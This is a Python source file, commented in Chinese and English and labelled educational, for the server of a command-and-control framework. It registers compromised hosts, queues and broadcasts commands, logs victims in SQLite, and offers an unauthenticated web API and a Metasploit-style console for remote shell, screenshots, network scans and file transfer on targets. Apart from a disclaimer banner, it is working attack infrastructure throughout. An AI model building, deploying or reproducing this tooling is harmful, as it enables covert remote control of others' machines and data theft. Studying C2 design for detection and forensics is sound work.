"""
============================================================================
 教育用途远程管理框架 - C2 服务端
 Educational Remote Administration Framework - C2 Server
============================================================================

 架构说明：
 ┌──────────────────┐     加密通道 (AES-GCM)     ┌──────────────────┐
 │   C2 Server      │ ◄═══════════════════════► │   Client Agent   │
 │                  │   TCP/TLS :8443          │   (被控端)        │
 │   - 多客户端管理  │                            │   - 命令执行      │
 │   - Web 控制台   │                            │   - 心跳上报      │
 │   - 命令分发     │                            │   - 文件传输      │
 │   - 日志审计     │                            │   - 系统信息      │
 └──────────────────┘                            └──────────────────┘

 学习要点：
 1. 异步 I/O (asyncio) 处理多客户端并发连接
 2. 会话管理：客户端注册、心跳、超时断开
 3. 命令分发与结果收集
 4. WebSocket 实现的 Web 控制台（可选）
 5. 数据库持久化（SQLite 存储客户端信息和操作日志）
"""

import os
import sys
import json
import time
import uuid
import signal
import asyncio
import sqlite3
import logging
import hashlib
import threading
import traceback
from typing import Dict, Set, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta

from config import config
from crypto_utils import (
    SymmetricCrypto, SecureChannel, MessageType,
    MessagePacket, TrafficObfuscator
)
from commands import CommandDispatcher

logger = logging.getLogger(__name__)


# ============================================================================
# 客户端会话 / Client Session
# ============================================================================

@dataclass
class ClientSession:
    """
    客户端会话对象

    跟踪每个连接客户端的完整状态
    """
    client_id: str
    hostname: str = "unknown"
    ip_address: str = "unknown"
    os_info: str = "unknown"
    username: str = "unknown"
    is_admin: bool = False

    # 连接状态
    connected_at: float = field(default_factory=time.time)
    last_heartbeat: float = field(default_factory=time.time)
    total_heartbeats: int = 0
    missed_heartbeats: int = 0

    # 通信通道
    channel: Optional[SecureChannel] = None
    reader: Optional[asyncio.StreamReader] = None
    writer: Optional[asyncio.StreamWriter] = None

    # 命令队列
    pending_commands: list = field(default_factory=list)
    command_results: list = field(default_factory=list)

    @property
    def is_alive(self) -> bool:
        """检查客户端是否存活"""
        timeout = config.network.heartbeat_interval * 4
        return (time.time() - self.last_heartbeat) < timeout

    @property
    def uptime_str(self) -> str:
        """运行时间字符串"""
        delta = timedelta(seconds=int(time.time() - self.connected_at))
        return str(delta)

    def to_dict(self) -> dict:
        """序列化为字典"""
        return {
            "client_id": self.client_id,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "username": self.username,
            "is_admin": self.is_admin,
            "connected_at": datetime.fromtimestamp(self.connected_at).isoformat(),
            "uptime": self.uptime_str,
            "is_alive": self.is_alive,
            "total_heartbeats": self.total_heartbeats,
        }


# ============================================================================
# 数据库管理 / Database Manager
# ============================================================================

class DatabaseManager:
    """
    SQLite 数据库管理器

    存储：客户端信息、命令日志、文件传输记录

    教育要点：
    - 攻击者也需要管理大量受害主机，数据库是常见方案
    - 防守方可通过磁盘取证恢复被删除的 C2 数据库
    """

    def __init__(self, db_path: str = "c2_database.db"):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._init_db()

    def _get_conn(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA foreign_keys=ON")
        return conn

    def _init_db(self):
        """初始化数据库表"""
        with self._lock:
            conn = self._get_conn()
            try:
                conn.executescript("""
                    CREATE TABLE IF NOT EXISTS clients (
                        client_id TEXT PRIMARY KEY,
                        hostname TEXT,
                        ip_address TEXT,
                        os_info TEXT,
                        username TEXT,
                        is_admin INTEGER DEFAULT 0,
                        first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        total_connections INTEGER DEFAULT 1
                    );

                    CREATE TABLE IF NOT EXISTS command_log (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        client_id TEXT,
                        command_name TEXT,
                        command_args TEXT,
                        result_success INTEGER,
                        result_output TEXT,
                        result_error TEXT,
                        duration_ms REAL,
                        executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id)
                    );

                    CREATE TABLE IF NOT EXISTS heartbeat_log (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        client_id TEXT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id)
                    );
                """)
                conn.commit()
            finally:
                conn.close()

    def upsert_client(self, session: ClientSession):
        """插入或更新客户端信息"""
        with self._lock:
            conn = self._get_conn()
            try:
                conn.execute("""
                    INSERT INTO clients (client_id, hostname, ip_address, os_info, username, is_admin)
                    VALUES (?, ?, ?, ?, ?, ?)
                    ON CONFLICT(client_id) DO UPDATE SET
                        hostname=excluded.hostname,
                        ip_address=excluded.ip_address,
                        os_info=excluded.os_info,
                        username=excluded.username,
                        is_admin=excluded.is_admin,
                        last_seen=CURRENT_TIMESTAMP,
                        total_connections=total_connections + 1
                """, (
                    session.client_id,
                    session.hostname,
                    session.ip_address,
                    session.os_info,
                    session.username,
                    1 if session.is_admin else 0,
                ))
                conn.commit()
            finally:
                conn.close()

    def log_command(self, client_id: str, cmd_name: str, cmd_args: dict,
                    success: bool, output: str, error: str, duration_ms: float):
        """记录命令执行日志"""
        with self._lock:
            conn = self._get_conn()
            try:
                conn.execute("""
                    INSERT INTO command_log
                    (client_id, command_name, command_args, result_success,
                     result_output, result_error, duration_ms)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (
                    client_id, cmd_name, json.dumps(cmd_args),
                    1 if success else 0, output, error, duration_ms
                ))
                conn.commit()
            finally:
                conn.close()

    def query_clients(self) -> list:
        """查询所有客户端"""
        with self._lock:
            conn = self._get_conn()
            try:
                rows = conn.execute(
                    "SELECT * FROM clients ORDER BY last_seen DESC"
                ).fetchall()
                return [dict(r) for r in rows]
            finally:
                conn.close()

    def query_commands(self, client_id: str = None, limit: int = 100) -> list:
        """查询命令历史"""
        with self._lock:
            conn = self._get_conn()
            try:
                if client_id:
                    rows = conn.execute(
                        "SELECT * FROM command_log WHERE client_id=? ORDER BY executed_at DESC LIMIT ?",
                        (client_id, limit)
                    ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT * FROM command_log ORDER BY executed_at DESC LIMIT ?",
                        (limit,)
                    ).fetchall()
                return [dict(r) for r in rows]
            finally:
                conn.close()


# ============================================================================
# C2 服务器核心 / C2 Server Core
# ============================================================================

class C2Server:
    """
    C2 (Command & Control) 服务器

    核心职责：
    1. 监听客户端连接
    2. 管理客户端会话
    3. 分发命令并收集结果
    4. 维护心跳检测
    """

    def __init__(self):
        self._crypto = SymmetricCrypto(config.crypto.derived_key)
        self._database = DatabaseManager()
        self._dispatcher = CommandDispatcher()

        # 活跃会话
        self._sessions: Dict[str, ClientSession] = {}
        self._sessions_lock = asyncio.Lock()

        # 服务器状态
        self._running = False
        self._server: Optional[asyncio.AbstractServer] = None

        # 控制台（可选 HTTP API）
        self._pending_console_commands: Dict[str, asyncio.Queue] = {}

        logger.info(
            f"C2 Server initialized | "
            f"Key: {config.crypto.derived_key[:8].hex()}... "
            f"({config.crypto.key_size * 8}-bit AES-GCM)"
        )

    # ------------------------------------------------------------------
    # 连接处理 / Connection Handling
    # ------------------------------------------------------------------

    async def start(self, host: str = None, port: int = None):
        """启动 C2 服务器"""
        if self._running:
            logger.warning("Server is already running")
            return

        host = host or config.network.server_host
        port = port or config.network.server_port

        self._running = True
        self._server = await asyncio.start_server(
            self._handle_client, host, port
        )

        addr = self._server.sockets[0].getsockname()
        logger.info(f"[+] C2 Server listening on {addr[0]}:{addr[1]}")

        # 启动心跳检查任务
        asyncio.create_task(self._heartbeat_checker())

        # 启动控制台服务器（WebSocket API）
        asyncio.create_task(self._start_console_api())

        try:
            async with self._server:
                await self._server.serve_forever()
        except asyncio.CancelledError:
            logger.info("Server shutdown requested")
        finally:
            await self.shutdown()

    async def shutdown(self):
        """关闭服务器"""
        logger.info("Shutting down C2 server...")
        self._running = False

        if self._server:
            self._server.close()
            await self._server.wait_closed()

        # 断开所有客户端
        async with self._sessions_lock:
            for session in list(self._sessions.values()):
                await self._disconnect_client(session, reason="Server shutdown")

    async def _handle_client(self, reader: asyncio.StreamReader,
                             writer: asyncio.StreamWriter):
        """
        处理新客户端连接

        这是每个客户端的入口点。
        asyncio 为每个连接创建独立的协程。
        """
        addr = writer.get_extra_info('peername')
        logger.info(f"[*] New connection from {addr[0]}:{addr[1]}")

        # 创建安全通道
        channel = SecureChannel(self._crypto)

        # 创建会话对象（尚未认证）
        session = ClientSession(
            client_id=f"UNREG-{addr[0]}:{addr[1]}",
            ip_address=addr[0],
            channel=channel,
            reader=reader,
            writer=writer,
        )

        try:
            # 等待客户端注册
            await self._handle_registration(session, reader, channel)

            # 主消息循环
            await self._message_loop(session, reader, channel)

        except asyncio.IncompleteReadError:
            logger.info(f"[-] Client {session.client_id} disconnected")
        except ConnectionResetError:
            logger.info(f"[-] Client {session.client_id} connection reset")
        except Exception as e:
            logger.error(f"[!] Client {session.client_id} error: {e}")
            logger.debug(traceback.format_exc())
        finally:
            await self._cleanup_session(session)

    async def _handle_registration(self, session: ClientSession,
                                    reader: asyncio.StreamReader,
                                    channel: SecureChannel):
        """处理客户端注册"""
        # 读取首次消息（应该是 REGISTER 消息）
        try:
            encrypted_data = await asyncio.wait_for(
                reader.read(4096),
                timeout=config.network.connect_timeout
            )
        except asyncio.TimeoutError:
            logger.warning(f"Registration timeout for {session.ip_address}")
            raise

        if not encrypted_data:
            raise ConnectionResetError("Empty registration data")

        packet = channel.unpack_message(encrypted_data)
        if packet is None:
            logger.warning(f"Failed to decrypt registration from {session.ip_address}")
            raise ValueError("Invalid registration packet")

        if packet.msg_type != MessageType.REGISTER:
            logger.warning(
                f"Expected REGISTER, got {packet.msg_type:#04x} "
                f"from {session.ip_address}"
            )
            raise ValueError("Invalid registration message type")

        # 解析系统信息
        try:
            sysinfo = json.loads(packet.payload.decode('utf-8'))
        except json.JSONDecodeError:
            sysinfo = {}

        session.client_id = sysinfo.get("client_id", session.client_id)
        session.hostname = sysinfo.get("hostname", "unknown")
        session.os_info = sysinfo.get("os", "unknown")
        session.username = sysinfo.get("username", "unknown")
        session.is_admin = sysinfo.get("is_admin", False)

        logger.info(
            f"[+] Client registered: {session.client_id} | "
            f"{session.hostname} ({session.ip_address}) | "
            f"{session.os_info} | Admin: {session.is_admin}"
        )

        # 添加到会话表
        async with self._sessions_lock:
            # 如果已有同 ID 会话，先断开旧连接
            if session.client_id in self._sessions:
                old = self._sessions[session.client_id]
                logger.info(f"    Replacing existing session for {session.client_id}")
                await self._disconnect_client(old, reason="Replaced by new connection")

            self._sessions[session.client_id] = session

        # 持久化到数据库
        self._database.upsert_client(session)

        # 发送 ACK
        ack = channel.pack_message(MessageType.ACK, b"REGISTER_OK")
        session.writer.write(ack)
        await session.writer.drain()

    async def _message_loop(self, session: ClientSession,
                            reader: asyncio.StreamReader,
                            channel: SecureChannel):
        """主消息循环 —— 处理来自客户端的各种消息"""
        while self._running:
            try:
                # 读取消息
                encrypted_data = await asyncio.wait_for(
                    reader.read(65536),  # 64KB max
                    timeout=config.network.recv_timeout
                )
            except asyncio.TimeoutError:
                # 超时不代表断开，继续等待
                continue

            if not encrypted_data:
                # EOF —— 客户端断开
                logger.info(f"Client {session.client_id} closed connection")
                break

            packet = channel.unpack_message(encrypted_data)
            if packet is None:
                logger.warning(f"Failed to decrypt message from {session.client_id}")
                continue

            # 根据消息类型分发处理
            handler = {
                MessageType.HEARTBEAT: self._handle_heartbeat,
                MessageType.RESPONSE: self._handle_command_response,
                MessageType.SYSTEM_INFO: self._handle_system_info,
                MessageType.FILE_DOWNLOAD: self._handle_file_download,
            }.get(packet.msg_type)

            if handler:
                await handler(session, packet)
            else:
                logger.warning(
                    f"Unknown message type {packet.msg_type:#04x} "
                    f"from {session.client_id}"
                )

    # ------------------------------------------------------------------
    # 消息处理器 / Message Handlers
    # ------------------------------------------------------------------

    async def _handle_heartbeat(self, session: ClientSession, packet: MessagePacket):
        """处理心跳"""
        session.last_heartbeat = time.time()
        session.total_heartbeats += 1
        session.missed_heartbeats = 0

        # 应答心跳
        hb_reply = session.channel.pack_message(
            MessageType.ACK, b"PONG"
        )
        session.writer.write(hb_reply)
        await session.writer.drain()

        # 检查是否有待发送的命令
        if session.pending_commands:
            cmd = session.pending_commands.pop(0)
            cmd_msg = session.channel.pack_message(
                MessageType.COMMAND,
                json.dumps(cmd).encode('utf-8')
            )
            session.writer.write(cmd_msg)
            await session.writer.drain()

            logger.debug(
                f"Sent queued command to {session.client_id}: {cmd['name']}"
            )

    async def _handle_command_response(self, session: ClientSession,
                                        packet: MessagePacket):
        """处理命令执行结果"""
        try:
            result = json.loads(packet.payload.decode('utf-8'))
        except json.JSONDecodeError:
            logger.error(f"Invalid command response from {session.client_id}")
            return

        cmd_id = result.get("command_id", "unknown")
        success = result.get("success", False)
        output = result.get("output", "")
        error = result.get("error", "")
        duration = result.get("duration_ms", 0)

        logger.info(
            f"[RESULT] {session.client_id} | {cmd_id} | "
            f"{'✓' if success else '✗'} | {duration:.0f}ms"
        )

        # 记录到数据库
        self._database.log_command(
            client_id=session.client_id,
            cmd_name=result.get("command_name", "unknown"),
            cmd_args=result.get("args", {}),
            success=success,
            output=output[:10000],  # Truncate
            error=error,
            duration_ms=duration,
        )

        # 转发到控制台
        await self._push_to_console(session.client_id, result)

        # 输出到本地日志
        if not success and error:
            logger.warning(f"    Error: {error[:200]}")
        if output:
            preview = output[:500].replace('\n', ' | ')
            logger.info(f"    Output: {preview}")

    async def _handle_system_info(self, session: ClientSession,
                                   packet: MessagePacket):
        """处理系统信息更新"""
        try:
            sysinfo = json.loads(packet.payload.decode('utf-8'))
            for key in ('hostname', 'os_info', 'username', 'is_admin'):
                if key in sysinfo:
                    setattr(session, key, sysinfo[key])
            self._database.upsert_client(session)
        except Exception as e:
            logger.error(f"Failed to parse system info: {e}")

    async def _handle_file_download(self, session: ClientSession,
                                     packet: MessagePacket):
        """处理文件下载数据（从客户端下载到服务端）"""
        try:
            file_info = json.loads(packet.payload.decode('utf-8'))
            logger.info(
                f"[FILE] Received from {session.client_id}: "
                f"{file_info.get('filename', 'unknown')} "
                f"({file_info.get('size', 0)} bytes)"
            )
            # 实际应该写入磁盘 —— 此处为简化演示
        except Exception as e:
            logger.error(f"File download error: {e}")

    # ------------------------------------------------------------------
    # 命令发送 / Command Dispatch
    # ------------------------------------------------------------------

    async def send_command(self, client_id: str, cmd_name: str,
                           args: Dict = None) -> Optional[str]:
        """
        向指定客户端发送命令

        Returns: command_id or None if client not found
        """
        cmd_id = uuid.uuid4().hex[:12]

        async with self._sessions_lock:
            session = self._sessions.get(client_id)
            if session is None:
                logger.warning(f"Client {client_id} not found")
                return None

            cmd_payload = {
                "command_id": cmd_id,
                "name": cmd_name,
                "args": args or {},
            }

            # 加入待发送队列（下次心跳时发送）
            session.pending_commands.append(cmd_payload)

        logger.info(f"[CMD] Queued {cmd_name} for {client_id} (id={cmd_id})")
        return cmd_id

    async def broadcast_command(self, cmd_name: str, args: Dict = None) -> int:
        """
        向所有在线客户端广播命令

        Returns: 成功排队的客户端数量
        """
        count = 0
        async with self._sessions_lock:
            for client_id in list(self._sessions.keys()):
                if await self.send_command(client_id, cmd_name, args):
                    count += 1
        return count

    # ------------------------------------------------------------------
    # 心跳检查 / Heartbeat Monitor
    # ------------------------------------------------------------------

    async def _heartbeat_checker(self):
        """定期检查客户端心跳状态"""
        while self._running:
            await asyncio.sleep(config.network.heartbeat_interval)

            async with self._sessions_lock:
                for client_id, session in list(self._sessions.items()):
                    if not session.is_alive:
                        session.missed_heartbeats += 1
                        max_missed = 4
                        if session.missed_heartbeats >= max_missed:
                            logger.info(
                                f"[!] Client {client_id} timed out "
                                f"(missed {session.missed_heartbeats} heartbeats)"
                            )
                            await self._disconnect_client(
                                session, reason="Heartbeat timeout"
                            )

    # ------------------------------------------------------------------
    # 会话清理 / Session Cleanup
    # ------------------------------------------------------------------

    async def _disconnect_client(self, session: ClientSession, reason: str = ""):
        """断开客户端连接并清理"""
        logger.info(f"[-] Disconnecting {session.client_id}: {reason}")

        try:
            if session.writer and not session.writer.is_closing():
                session.writer.close()
                await session.writer.wait_closed()
        except Exception:
            pass

    async def _cleanup_session(self, session: ClientSession):
        """清理客户端会话"""
        async with self._sessions_lock:
            self._sessions.pop(session.client_id, None)

        await self._disconnect_client(session, reason="Cleanup")

    # ------------------------------------------------------------------
    # Web 控制台 API（可选）/ Console API
    # ------------------------------------------------------------------

    async def _start_console_api(self, host: str = "127.0.0.1", port: int = 8080):
        """
        启动 Web Console API (HTTP + WebSocket)

        提供简单的 REST API 供外部管理工具使用。
        实际产品中会用 JWT token 或 mTLS 认证。
        """
        try:
            from aiohttp import web

            app = web.Application()
            app['c2_server'] = self

            # REST API 路由
            app.router.add_get('/api/clients', self._api_list_clients)
            app.router.add_post('/api/command', self._api_send_command)
            app.router.add_get('/api/commands', self._api_command_history)
            app.router.add_get('/api/stats', self._api_stats)
            app.router.add_get('/ws', self._ws_handler)

            # CORS (调试用，生产环境需限制)
            async def cors_middleware(app, handler):
                async def middleware(request):
                    if request.method == 'OPTIONS':
                        resp = web.Response()
                        resp.headers['Access-Control-Allow-Origin'] = '*'
                        resp.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
                        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
                        return resp
                    resp = await handler(request)
                    resp.headers['Access-Control-Allow-Origin'] = '*'
                    return resp
                return middleware

            app.middlewares.append(cors_middleware)

            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, host, port)
            await site.start()

            logger.info(f"[WEB] Console API listening on http://{host}:{port}")

            # 保持运行
            while self._running:
                await asyncio.sleep(1)

            await runner.cleanup()
        except ImportError:
            logger.info("aiohttp not installed. Web console disabled. "
                       "Install: pip install aiohttp")
        except Exception as e:
            logger.error(f"Failed to start console API: {e}")

    async def _api_list_clients(self, request):
        """GET /api/clients —— 列出所有客户端"""
        from aiohttp import web

        clients = []
        async with self._sessions_lock:
            for session in self._sessions.values():
                clients.append(session.to_dict())

        return web.json_response({"count": len(clients), "clients": clients})

    async def _api_send_command(self, request):
        """POST /api/command —— 向客户端发送命令"""
        from aiohttp import web

        try:
            data = await request.json()
        except Exception:
            return web.json_response({"error": "Invalid JSON"}, status=400)

        client_id = data.get("client_id")
        cmd_name = data.get("command")
        args = data.get("args", {})

        if not client_id or not cmd_name:
            return web.json_response(
                {"error": "client_id and command are required"}, status=400
            )

        cmd_id = await self.send_command(client_id, cmd_name, args)
        if cmd_id is None:
            return web.json_response(
                {"error": f"Client {client_id} not found"}, status=404
            )

        return web.json_response({"command_id": cmd_id, "status": "queued"})

    async def _api_command_history(self, request):
        """GET /api/commands —— 查询命令历史"""
        from aiohttp import web

        client_id = request.query.get("client_id")
        limit = int(request.query.get("limit", 100))

        commands = self._database.query_commands(client_id, limit)
        return web.json_response({"count": len(commands), "commands": commands})

    async def _api_stats(self, request):
        """GET /api/stats —— 服务器统计信息"""
        from aiohttp import web

        stats = {
            "version": config.version,
            "total_clients": len(self._sessions),
            "online_clients": sum(1 for s in self._sessions.values() if s.is_alive),
            "server_uptime": "N/A",  # Could track with start_time
            "crypto": f"AES-{config.crypto.key_size * 8}-GCM",
        }
        return web.json_response(stats)

    async def _ws_handler(self, request):
        """WebSocket 实时事件推送"""
        from aiohttp import web, WSMsgType

        ws = web.WebSocketResponse()
        await ws.prepare(request)

        queue = asyncio.Queue()
        ws_id = f"ws-{uuid.uuid4().hex[:8]}"
        self._pending_console_commands[ws_id] = queue

        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        if data.get("type") == "command":
                            cmd_id = await self.send_command(
                                data["client_id"],
                                data["command"],
                                data.get("args", {})
                            )
                            await ws.send_json({
                                "type": "command_queued",
                                "command_id": cmd_id,
                            })
                    except Exception as e:
                        await ws.send_json({"type": "error", "message": str(e)})

            return ws

        finally:
            self._pending_console_commands.pop(ws_id, None)

    async def _push_to_console(self, client_id: str, result: dict):
        """推送结果到所有 WebSocket 客户端"""
        event = {
            "type": "command_result",
            "client_id": client_id,
            "result": result,
        }
        for queue in self._pending_console_commands.values():
            await queue.put(event)


# ============================================================================
# 交互式 CLI / Interactive CLI
# ============================================================================

class InteractiveConsole:
    """
    交互式命令行控制台

    连接到已运行的 C2 服务器实例，提供类 Metasploit 的交互体验。
    """

    def __init__(self, server: C2Server):
        self._server = server
        self._running = False
        self._current_client: Optional[str] = None

    async def start(self):
        """启动交互式控制台"""
        self._running = True

        print("\n" + "=" * 60)
        print("  教育用途 C2 控制台 / Educational C2 Console")
        print("  Type 'help' for available commands")
        print("=" * 60)

        loop = asyncio.get_event_loop()

        while self._running:
            try:
                # 异步读取输入
                prompt = f"\nC2 [{self._current_client or 'none'}] > "
                cmd = await loop.run_in_executor(None, input, prompt)
                cmd = cmd.strip()

                if not cmd:
                    continue

                await self._process_command(cmd)

            except (KeyboardInterrupt, EOFError):
                print("\n[!] Exiting console...")
                break

    async def _process_command(self, cmd: str):
        """处理控制台命令"""
        parts = cmd.split()
        action = parts[0].lower()

        try:
            if action == "help":
                self._cmd_help()
            elif action == "clients" or action == "sessions":
                await self._cmd_list_clients()
            elif action == "interact" and len(parts) > 1:
                await self._cmd_interact(parts[1])
            elif action == "back":
                self._current_client = None
                print("[*] Back to main context")
            elif action == "shell" and self._current_client:
                await self._cmd_shell(' '.join(parts[1:]))
            elif action == "sysinfo" and self._current_client:
                await self._cmd_sysinfo()
            elif action == "ls" and self._current_client:
                path = parts[1] if len(parts) > 1 else "."
                await self._cmd_ls(path)
            elif action == "ps" and self._current_client:
                await self._cmd_ps()
            elif action == "broadcast" and self._current_client is None:
                cmd_name = parts[1] if len(parts) > 1 else "sysinfo"
                count = await self._server.broadcast_command(cmd_name)
                print(f"[*] Broadcast {cmd_name} to {count} clients")
            elif action == "exit" or action == "quit":
                self._running = False
                print("[*] Shutting down...")
                await self._server.shutdown()
            else:
                print(f"[!] Unknown command: {action}. Type 'help'")

        except Exception as e:
            print(f"[!] Error: {e}")

    def _cmd_help(self):
        """显示帮助信息"""
        help_text = """
 Available Commands:
 ═══════════════════════════════════════════════════════════
 Core:
   help                  Show this help
   clients / sessions    List all connected clients
   interact <id>         Select a client to interact with
   back                  Return to main context
   exit / quit           Shutdown server and exit

 Client Commands (require 'interact' first):
   shell <command>       Execute shell command on target
   sysinfo               Get system information
   ls [path]             List directory contents
   ps                    List running processes
   kill <pid>|<name>     Terminate a process
   screenshot            Capture desktop screenshot
   netscan [subnet]      Scan local network
   upload <local> <remote> Upload file to target
   download <remote>    Download file from target

 Server Commands:
   broadcast <command>   Send command to all clients
 ═══════════════════════════════════════════════════════════
"""
        print(help_text)

    async def _cmd_list_clients(self):
        """列出所有客户端"""
        async with self._server._sessions_lock:
            if not self._server._sessions:
                print("[*] No clients connected")
                return

            print(f"\n{'ID':<24} {'Hostname':<20} {'IP':<18} {'OS':<20} {'Status':<10}")
            print("-" * 95)
            for cid, s in self._server._sessions.items():
                status = "ALIVE" if s.is_alive else "DEAD"
                marker = " *" if cid == self._current_client else "  "
                print(f"{marker}{cid:<22} {s.hostname:<20} "
                      f"{s.ip_address:<18} {s.os_info[:19]:<20} {status:<10}")

    async def _cmd_interact(self, client_id_prefix: str):
        """选择交互客户端"""
        async with self._server._sessions_lock:
            matches = [
                cid for cid in self._server._sessions
                if cid.startswith(client_id_prefix)
            ]
            if len(matches) == 1:
                self._current_client = matches[0]
                session = self._server._sessions[matches[0]]
                print(f"[*] Interacting with {session.hostname} ({matches[0]})")
            elif len(matches) > 1:
                print(f"[*] Multiple matches: {', '.join(matches)}")
            else:
                print(f"[!] No client matching '{client_id_prefix}'")

    async def _cmd_shell(self, command: str):
        """向当前客户端发送 shell 命令"""
        if not command:
            print("[!] Usage: shell <command>")
            return
        cmd_id = await self._server.send_command(
            self._current_client, "shell", {"command": command}
        )
        if cmd_id:
            print(f"[*] Command queued: {cmd_id}")
            # 等待结果（简化版，实际应用会异步通知）
            await asyncio.sleep(2)
            print("[*] Result will appear in the server log. "
                  "Web console provides real-time updates.")

    async def _cmd_sysinfo(self):
        """获取系统信息"""
        cmd_id = await self._server.send_command(
            self._current_client, "sysinfo", {}
        )
        if cmd_id:
            print(f"[*] Sysinfo requested: {cmd_id}")

    async def _cmd_ls(self, path: str):
        """列出目录"""
        cmd_id = await self._server.send_command(
            self._current_client, "ls", {"path": path}
        )
        if cmd_id:
            print(f"[*] Directory listing requested: {cmd_id}")

    async def _cmd_ps(self):
        """进程列表"""
        cmd_id = await self._server.send_command(
            self._current_client, "ps", {}
        )
        if cmd_id:
            print(f"[*] Process list requested: {cmd_id}")


# ============================================================================
# 主入口 / Main Entry Point
# ============================================================================

async def main():
    """主函数"""
    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(config.log.file_path, encoding='utf-8'),
        ]
    )

    print("""
╔══════════════════════════════════════════════════════════════╗
║    教育用途远程管理框架 v{version:<6}                        ║
║    Educational Remote Administration Framework               ║
║                                                              ║
║    ⚠  WARNING: FOR EDUCATIONAL USE ONLY                      ║
║    仅限授权环境使用。未经授权使用属于违法行为。              ║
╚══════════════════════════════════════════════════════════════╝
""".format(version=config.version))

    # 密钥信息
    print(f"[*] AES Key: {config.crypto.derived_key[:8].hex()}... "
          f"({config.crypto.key_size*8}-bit)")
    print(f"[*] Server: {config.network.server_host}:{config.network.server_port}")
    print()

    # 创建并启动 C2 服务器
    server = C2Server()

    # 创建控制台（在后台运行）
    console = InteractiveConsole(server)

    # 启动服务器和控制台并发运行
    server_task = asyncio.create_task(server.start())
    console_task = asyncio.create_task(console.start())

    # 等待任一任务完成
    done, pending = await asyncio.wait(
        [server_task, console_task],
        return_when=asyncio.FIRST_COMPLETED
    )

    # 取消未完成的任务
    for task in pending:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        traceback.print_exc()
